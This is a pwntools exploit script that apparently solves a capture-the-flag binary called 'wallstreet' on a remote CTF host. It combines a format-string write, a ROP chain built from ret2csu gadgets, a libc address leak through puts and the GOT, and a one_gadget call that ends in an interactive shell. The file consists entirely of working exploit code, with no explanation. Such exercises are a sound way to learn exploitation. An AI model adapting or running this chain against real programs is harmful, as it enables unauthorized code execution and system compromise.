from pwn import *

e = ELF("./wallstreet")
libc = ELF("./libc-2.32.so")
#ld = ELF("./ld-2.32.so")

context.binary = e
context.terminal = ["konsole", "-e"]

#p = process([e.path])
p = remote("pwn.2021.chall.actf.co", 21800)
#p = remote("localhost", 21800)

context.log_level="debug"
gdb.attach(p, """break * buy_stonks+195\nbreak * buy_stonks+382\nc""")




p.sendlineafter("!", "1")



p.sendlineafter("!", "68")


poprdi = 0x00000000004015c3
csu1 = 0x00000000004015a0
csu2 = 0x00000000004015ba
ret = 0x000000000040101a

chain = p64(poprdi) + p64(e.got["puts"]) + p64(e.plt["puts"]) + \
        p64(csu2) + p64(0) + p64(1) + p64(0) + p64(0x404210) + p64(0x100) + p64(0x4000f8) + \
        p64(csu1) + p64(0)*6 + p64(0) + p64(e.plt["read"]-4) + \
        p64(ret) * 16 + p64(ret)[:3]


p.sendafter("?", ("%{}c%73$lln" + chain).format(e.sym["user_buf"]+8))

for i in range(5):
    p.recvline()

libc.address = u64(p.recv(6).ljust(8, "\x00")) - 0x80d90

print("libc", hex(libc.address))


og = 0xdf54c

chain2 = p64(libc.address + og)


p.send(chain2)

p.interactive()
